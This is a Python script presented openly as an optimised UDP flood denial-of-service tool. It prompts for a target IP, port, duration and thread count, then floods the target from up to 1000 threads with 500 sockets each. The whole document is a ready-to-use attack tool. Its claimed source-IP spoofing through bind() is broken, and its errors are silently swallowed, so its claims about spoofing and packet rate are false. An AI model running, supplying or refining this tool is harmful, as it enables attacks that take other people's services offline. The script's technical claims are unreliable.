import socket  
import random  
import threading  
import time  

# Configuration  
packet_size = 1024  # Use smaller packets for higher PPS  
max_threads = 1000  # Scalable threads for high performance  
sockets_per_thread = 500  # Increase sockets per thread to scale PPS  

def generate_payload(size):  
    return random._urandom(size)  

def spoofed_ip():  
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"  

def udp_attack(ip, port, duration):  
    timeout = time.time() + duration  
    sent = 0  
    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(sockets_per_thread)]  

    while time.time() < timeout:  
        try:  
            payload = generate_payload(packet_size)  
            for sock in sockets:  
                sock.bind((spoofed_ip(), 0))  # Randomize source IP  
                sock.sendto(payload, (ip, port))  
                sent += 1  
        except Exception:  
            pass  

    print(f"Thread finished: Sent {sent} packets.")  

def start_attack(ip, port, duration, num_threads):  
    print(f"Launching 2M PPS UDP flood on {ip}:{port} with {num_threads} threads and {sockets_per_thread} sockets per thread.")  
    threads_list = []  

    for _ in range(num_threads):  
        thread = threading.Thread(target=udp_attack, args=(ip, port, duration))  
        threads_list.append(thread)  
        thread.start()  

    for thread in threads_list:  
        thread.join()  

if __name__ == "__main__":  
    print("2M PPS Optimized UDP Flood Script")  
    print("=================================")  
    print("Enter command in the format: attack [IP] [Port] [Time] [Threads]")  

    command = input("Enter your command: ")  

    if command.startswith("attack"):  
        try:  
            _, ip, port, duration, num_threads = command.split()  
            port = int(port)  
            duration = int(duration)  
            num_threads = int(num_threads)  

            if num_threads > max_threads:  
                print(f"Max threads allowed: {max_threads}. Adjusting to {max_threads}.")  
                num_threads = max_threads  

            print("\nStarting attack...")  
            start_attack(ip, port, duration, num_threads)  
        except ValueError:  
            print("Invalid input format. Use: attack [IP] [Port] [Time] [Threads]")  
    else:  
        print("Command must start with 'attack'.")